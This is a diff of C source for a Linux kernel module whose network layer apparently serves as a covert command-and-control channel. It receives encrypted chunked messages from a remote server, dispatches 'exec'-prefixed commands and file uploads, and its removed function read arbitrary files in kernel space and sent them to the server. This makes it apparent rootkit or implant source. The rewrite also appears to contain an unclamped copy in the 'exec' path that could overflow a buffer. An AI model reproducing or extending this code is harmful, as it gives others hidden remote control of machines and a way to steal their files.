@@ -1,5 +1,7 @@
 #include "network.h"
 
+#include "upload.h"
+
 /*
  * Custom communication protocol:
  * Each message is divided into fixed-size chunks (STD_BUFFER_SIZE).
@@ -164,152 +166,157 @@ int receive_from_server(char *buffer, size_t max_len) {
     if (!sock)
         return -EINVAL;
 
-    char *received = kzalloc(max_len, GFP_KERNEL);
-    if (!received) {
-        ERR_MSG("receive_from_server: failed to allocate buffer\n");
-        return -ENOMEM;
-    }
+    // Const of the frame
+    const size_t FRAME_SIZE_FULL = STD_BUFFER_SIZE;
+    const size_t HEADER_SIZE = 10;
+    const size_t EOT_SIZE = 1;
+    const size_t BODY_SIZE = FRAME_SIZE_FULL - HEADER_SIZE - EOT_SIZE;
 
-    bool *received_chunks = NULL;
-    size_t total_received = 0;
+    // Statically sized temp buffers
+    char header_buffer[10];
+    char payloadbuf[FRAME_SIZE_FULL];
+    char padbuf[10];
+
+    char *received = NULL;
+    bool *seen = NULL;
     size_t nb_chunks = 0;
+    size_t total_received = 0;
+    int ret = -EIO;
 
+    // Read and assemble all chunks (please pray god)
     while (true) {
-        char *chunk = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-        if (!chunk) {
-            ERR_MSG("receive_from_server: failed to allocate chunk buffer\n");
-            kfree(received);
-            return -ENOMEM;
+        int off, n;
+        uint32_t total, index;
+        uint16_t data_len;
+
+        // Read exactly the size of header in bytes
+        off = 0;
+        while (off < HEADER_SIZE) {
+            struct kvec vec = { .iov_base = header_buffer + off, .iov_len = HEADER_SIZE - off };
+            struct msghdr msg = { 0 };
+            n = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
+            if (n <= 0) {
+                ret = -EIO;
+                goto cleanup;
+            }
+
+            off += n;
         }
 
-        // Receive a single chunk
-        struct kvec vec = { .iov_base = chunk, .iov_len = STD_BUFFER_SIZE };
-        struct msghdr msg = { 0 };
-        int ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
-        if (ret <= 0) {
-            kfree(chunk);
-            kfree(received);
-            return -EIO;
+        // Parse the fucking big endian fields
+        total = be32_to_cpu(*(__be32 *)(header_buffer + 0));
+        index = be32_to_cpu(*(__be32 *)(header_buffer + 4));
+        data_len = be16_to_cpu(*(__be16 *)(header_buffer + 8));
+        if (data_len > BODY_SIZE) {
+            ret = -EINVAL;
+            goto cleanup;
         }
 
-        // Extract header informations (10 octets) in big-endian (ouch)
-        uint32_t total = ((uint8_t) chunk[0] << 24) 
-            | ((uint8_t) chunk[1] << 16)
-            | ((uint8_t) chunk[2] << 8)
-            | ((uint8_t) chunk[3]);
-
-        uint32_t index = ((uint8_t)chunk[4] << 24)
-            | ((uint8_t) chunk[5] << 16)
-            | ((uint8_t) chunk[6] << 8)
-            | ((uint8_t) chunk[7]);
-
-        uint16_t data_len = ((uint8_t)chunk[8] << 8)
-            | ((uint8_t)chunk[9]);
-
-        // Validate end-of-transmission
-         if ((uint8_t)chunk[10 + data_len] != EOT_CODE) {
-            kfree(chunk);
-            kfree(received);
-            return -EINVAL;
+        // Read payload and the EOT
+        off = 0;
+        while (off < (int)(data_len + EOT_SIZE)) {
+            struct kvec vec = { .iov_base = payloadbuf + off, .iov_len = (data_len + EOT_SIZE) - off };
+            struct msghdr msg = { 0 };
+            n = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
+            if (n <= 0) {
+                ret = -EIO;
+                goto cleanup;
+            }
+            off += n;
         }
 
-        // Initialize tracking array on first valid chunk
-        if (!received_chunks) {
+        if ((uint8_t)payloadbuf[data_len] != EOT_CODE) {
+            ret = -EINVAL;
+            goto cleanup;
+        }
+
+        // Discard remaining padding up to FRAME_SIZE_FULL
+        size_t pad = FRAME_SIZE_FULL - (HEADER_SIZE + data_len + EOT_SIZE);
+        while (pad > 0) {
+            size_t rd = pad > HEADER_SIZE ? HEADER_SIZE : pad;
+            struct kvec vec = { .iov_base = padbuf, .iov_len = rd };
+            struct msghdr msg = { 0 };
+            n = kernel_recvmsg(sock, &msg, &vec, 1, rd, 0);
+            if (n <= 0) {
+                ret = -EIO;
+                goto cleanup;
+            }
+            pad -= n;
+        }
+
+        // DEBUG
+        DBG_MSG("CHUNK %u/%u len=%u", index, total, data_len);
+
+        // On first real chunk, allocate the big buffer and the bool buffer
+        if (!received) {
             nb_chunks = total;
-            received_chunks = kzalloc(nb_chunks * sizeof(bool), GFP_KERNEL);
-            if (!received_chunks) {
-                kfree(chunk);
-                kfree(received);
-                return -ENOMEM;
+            received = vmalloc(nb_chunks * BODY_SIZE);
+            seen = kzalloc(nb_chunks * sizeof(bool), GFP_KERNEL);
+            if (!received || !seen) {
+                ret = -ENOMEM;
+                goto cleanup;
             }
         }
 
-         // Check index
-        if (index >= nb_chunks) {
-            kfree(chunk);
-            kfree(received);
-            kfree(received_chunks);
-            return -EINVAL;
+        // Check the problems
+        if (total != nb_chunks || index >= nb_chunks) {
+            ret = -EINVAL;
+            goto cleanup;
         }
 
-        // Skip duplicate chunks
-        if (received_chunks[index]) {
-            kfree(chunk);
-            continue;
+        if (!seen[index]) {
+            memcpy(received + index * BODY_SIZE, payloadbuf, data_len);
+            seen[index] = true;
+            total_received += data_len;
         }
 
-        size_t max_chunk_body = STD_BUFFER_SIZE - CHUNK_OVERHEAD; // 1013
-        if (data_len > max_chunk_body) {
-            kfree(chunk);
-            kfree(received);
-            kfree(received_chunks);
-            return -EINVAL;
-        }
-
-        // Store chunk data in its proper position
-        size_t payload_offset = CHUNK_OVERHEAD - 1;
-        memcpy(received + index * (STD_BUFFER_SIZE - CHUNK_OVERHEAD), chunk + payload_offset, data_len);
-        received_chunks[index] = true;
-        total_received += data_len;
-
-        kfree(chunk);
-
-        // Exit once all chunks are received
-        if (all_chunks_received(received_chunks, nb_chunks))
+        // Exit once we have every chunk (maybe should add a timeout)
+        if (all_chunks_received(seen, nb_chunks))
             break;
     }
 
-    kfree(received_chunks);
+    kfree(seen);
+    seen = NULL;
 
+    // Decrypt and dispatch
     char *decrypted = NULL;
-    size_t decrypted_len = 0;
+    size_t dlen = 0;
 
-    // Decrypt the assembled message
-    if (decrypt_buffer(received, total_received, &decrypted, &decrypted_len) < 0) {
-        kfree(received);
-        return -EIO;
+    ret = decrypt_buffer(received, total_received, &decrypted, &dlen);
+    vfree(received);
+    received = NULL;
+    if (ret < 0)
+        goto cleanup;
+
+    // Clamp for text command mode
+    if (!receiving_file && dlen > max_len - 1)
+        dlen = max_len - 1;
+
+    // fuck exec prefix
+    if (dlen >= 4 && !memcmp(decrypted, "exec", 4)) {
+        memcpy(buffer, decrypted, dlen);
+        buffer[dlen] = '\0';
+        ret = dlen;
     }
 
-    decrypted_len = min(decrypted_len, max_len - 1);
-    memcpy(buffer, decrypted, decrypted_len);
-    buffer[decrypted_len] = '\0'; // Null-terminate the result
+    // File upload mode
+    else if (receiving_file) {
+        DBG_MSG("RECEIVING FILE : got %zu bytes", dlen);
+        ret = handle_upload_chunk(decrypted, dlen, TCP);
+    }
 
-    kfree(received);
+    // Otherwise it is the normal text command
+    else {
+        memcpy(buffer, decrypted, dlen);
+        buffer[dlen] = '\0';
+        ret = dlen;
+    }
+
     vfree(decrypted);
-    return decrypted_len;
-}
+    return ret;
 
-// Sends the content of a file to the server using the chunked protocol
-int send_file_to_server(char *filename) {
-    struct file *file = filp_open(filename, O_RDONLY, 0);
-    if (IS_ERR(file))
-        return PTR_ERR(file);
-
-    loff_t size = i_size_read(file_inode(file));
-    if (size <= 0) {
-        filp_close(file, NULL);
-        return -EINVAL;
-    }
-
-    char *buffer = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!buffer) {
-        ERR_MSG("send_file_to_server: failed to allocate file buffer\n");
-        filp_close(file, NULL);
-        return -ENOMEM;
-    }
-
-    loff_t pos = 0;
-    ssize_t read;
-    int ret = 0;
-
-    // Read file in chunks and send them one by one
-    while ((read = kernel_read(file, buffer, STD_BUFFER_SIZE, &pos)) > 0) {
-        ret = send_to_server_raw(buffer, read);
-        if (ret < 0)
-            break;
-    }
-
-    kfree(buffer);
-    filp_close(file, NULL);
-    return ret < 0 ? ret : 0;
+cleanup:
+    kfree(seen);
+    vfree(received);
+    return ret;
 }
